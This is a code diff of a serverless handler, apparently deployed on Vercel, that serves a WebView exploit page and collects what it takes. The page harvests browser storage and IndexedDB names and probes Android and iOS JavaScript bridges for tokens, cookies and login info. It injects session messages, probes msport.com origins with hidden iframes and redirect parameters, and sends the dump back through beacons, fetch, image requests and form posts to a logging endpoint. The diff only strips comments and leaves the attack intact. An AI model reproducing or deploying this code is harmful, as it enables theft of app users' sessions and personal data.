@@ -1,20 +1,16 @@
-// api/index.js — Vercel Node serverless
-// GET  /api         -> serves exploit HTML
-// POST /api         -> receives exfil (also accepts sendBeacon text/plain)
-// GET  /api?d=...   -> 1x1 gif beacon, logs payload
-//
-// Deployed: https://haxor-net.vercel.app/api
-
 const HITS = [];
 
-export default async function handler(req, res) {
-  // CORS
+function clientIp(req) {
+  const xff = req.headers['x-forwarded-for'];
+  return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
+}
+
+module.exports = async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', '*');
   if (req.method === 'OPTIONS') return res.status(204).end();
 
-  // ---------- POST receiver ----------
   if (req.method === 'POST') {
     let body = '';
     await new Promise((resolve) => {
@@ -22,34 +18,20 @@ export default async function handler(req, res) {
       req.on('end', resolve);
       req.on('error', resolve);
     });
-    // sendBeacon may send JSON as text/plain; strip a possible "d=" prefix
     let payload = body;
     if (payload.startsWith('d=')) {
       try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {}
     }
-    const hit = {
-      t: new Date().toISOString(),
-      ip: clientIp(req),
-      ua: req.headers['user-agent'],
-      referer: req.headers['referer'] || req.headers['referrer'] || '',
-      body: payload,
-    };
+    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
     HITS.push(hit);
     console.log('=== EXFIL HIT ===', JSON.stringify(hit));
     return res.status(200).json({ ok: true });
   }
 
-  // ---------- GET beacon fallback ----------
   if (req.query && req.query.d) {
     let payload = String(req.query.d);
     try { payload = decodeURIComponent(payload); } catch (e) {}
-    const hit = {
-      t: new Date().toISOString(),
-      ip: clientIp(req),
-      ua: req.headers['user-agent'],
-      referer: req.headers['referer'] || req.headers['referrer'] || '',
-      body: payload,
-    };
+    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
     HITS.push(hit);
     console.log('=== EXFIL BEACON ===', JSON.stringify(hit));
     const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
@@ -58,7 +40,6 @@ export default async function handler(req, res) {
     return res.status(200).send(gif);
   }
 
-  // ---------- Exploit page ----------
   const html = `<!DOCTYPE html>
 <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Loading…</title></head>
@@ -82,17 +63,14 @@ export default async function handler(req, res) {
     iframe_bridges: {}, redirect_probe: {}, perf_nav: {}
   };
 
-  // localStorage / sessionStorage
   try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); dump.ls[k]=localStorage.getItem(k);} } catch(e){}
   try { for (var i=0;i<sessionStorage.length;i++){ var k=sessionStorage.key(i); dump.ss[k]=sessionStorage.getItem(k);} } catch(e){}
 
-  // performance navigation (did a redirect happen?)
   try {
     var nav = performance.getEntriesByType && performance.getEntriesByType('navigation');
     if (nav && nav[0]) dump.perf_nav = { type: nav[0].type, redirectCount: nav[0].redirectCount, name: nav[0].name };
   } catch(e){}
 
-  // IndexedDB names (some apps stash tokens there)
   try {
     if (indexedDB && indexedDB.databases) {
       indexedDB.databases().then(function(dbs){ dump.idb_names = (dbs||[]).map(function(d){return d.name}); }).catch(function(){});
@@ -108,7 +86,6 @@ export default async function handler(req, res) {
     }catch(e){ return '[x]' }
   }
 
-  // Bridge candidate names
   var NAMES = ['action_login','actionLogin','AndroidBridge','Android','AppBridge','app',
     'jsBridge','JsBridge','JSBridge','nativeBridge','NativeBridge','bridge',
     'webviewBridge','WebViewBridge','mwebview','MWebView','mwebviewactivity',
@@ -135,7 +112,6 @@ export default async function handler(req, res) {
     return o;
   }
 
-  // Probe common message-passing methods
   var PAYLOADS = [
     {handler:'getToken'}, {handler:'getUserInfo'}, {handler:'getLoginInfo'},
     {handler:'getSession'}, {handler:'getCookies'},
@@ -161,7 +137,6 @@ export default async function handler(req, res) {
     }
   }
 
-  // Phase 1: enumerate bridges present right now
   function scanBridges(bucket, tag){
     for (var n=0; n<NAMES.length; n++) {
       var name = NAMES[n];
@@ -175,7 +150,6 @@ export default async function handler(req, res) {
   }
   scanBridges(dump.bridges, 'main');
 
-  // Phase 2: session-injection probe against action_login (Android style)
   try {
     if (window.action_login && typeof window.action_login.postMessage === 'function') {
       window.action_login.postMessage(JSON.stringify({
@@ -187,7 +161,6 @@ export default async function handler(req, res) {
     }
   } catch(e) { dump.probes['action_login.inject'] = 'ERR:'+String(e); }
 
-  // Phase 3: iOS-style WKWebView message handler (harmless if absent)
   try {
     if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.action_login) {
       window.webkit.messageHandlers.action_login.postMessage({
@@ -197,10 +170,6 @@ export default async function handler(req, res) {
     }
   } catch(e) { dump.probes['webkit.action_login.inject'] = 'ERR:'+String(e); }
 
-  // Phase 4: cross-origin cookie probe — navigate hidden iframes and see if
-  // they redirect back authenticated (can't read cookies, but tells you which
-  // origins the WebView has a session for). Also checks if msport.com is
-  // reachable as a redirect target so the bridge survives navigation.
   var ORIGINS = ['https://msport.com','https://www.msport.com','https://api.msport.com','https://m.msport.com','https://h5.msport.com'];
   ORIGINS.forEach(function(origin){
     try {
@@ -209,8 +178,6 @@ export default async function handler(req, res) {
       f.src = origin + '/favicon.ico?_=' + Date.now();
       f.onload = function(){
         dump.cross_origin_cookies[origin] = 'loaded';
-        // Try to detect if bridge is visible inside the iframe (same-process
-        // WebView may leak addJavascriptInterface into child frames).
         try {
           var w = f.contentWindow;
           if (w && w.action_login) {
@@ -226,9 +193,6 @@ export default async function handler(req, res) {
     } catch(e) { dump.cross_origin_cookies[origin] = 'ERR:'+String(e); }
   });
 
-  // Phase 5: redirect-preservation probes. Try to load msport.com with a
-  // redirect parameter pointing back to us — if the bridge survives, the
-  // next hit will show it registered for our origin.
   var REDIRECT_PARAMS = ['redirect','next','return','returnUrl','return_url','callback','url','to','target','jumpUrl','jump_url'];
   var OUR = location.origin + location.pathname;
   REDIRECT_PARAMS.forEach(function(p){
@@ -238,8 +202,6 @@ export default async function handler(req, res) {
     } catch(e){}
   });
 
-  // Phase 6: delayed re-probe — some apps register the bridge after a delay
-  // or after the page reports 'ready'.
   setTimeout(function(){
     var late = { bridges: {}, probes: {}, ts: new Date().toISOString(), phase: 'late' };
     for (var n=0; n<NAMES.length; n++) {
@@ -252,23 +214,15 @@ export default async function handler(req, res) {
     }
   }, 3000);
 
-  // ---- EXFIL ----
   var body = JSON.stringify(dump);
   log('collected', body.length + ' bytes');
   log('origin', dump.origin);
   log('cookie_len', dump.cookie_len);
   log('bridges', Object.keys(dump.bridges).join(',') || '(none)');
 
-  // 1) sendBeacon — most reliable POST from WebView, survives unload, no preflight
   try { navigator.sendBeacon('/api', body); } catch(e){}
-
-  // 2) no-cors fetch (works even when CORS preflight is blocked)
   try { fetch('/api', { method: 'POST', mode: 'no-cors', body: body, keepalive: true }).catch(function(){}); } catch(e){}
-
-  // 3) image beacon (truncated to 1800 chars)
   try { (new Image()).src = '/api?d=' + encodeURIComponent(body.slice(0,1800)) + '&_=' + Date.now(); } catch(e){}
-
-  // 4) form POST fallback (truncated to 4000 chars)
   try {
     var f = document.createElement('form');
     f.method = 'POST'; f.action = '/api'; f.target = '_blank';
@@ -282,10 +236,4 @@ export default async function handler(req, res) {
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
   res.setHeader('Cache-Control', 'no-store');
   return res.status(200).send(html);
-}
-
-function clientIp(req) {
-  const xff = req.headers['x-forwarded-for'];
-  const ip = xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress);
-  return ip || 'unknown';
-}
+};
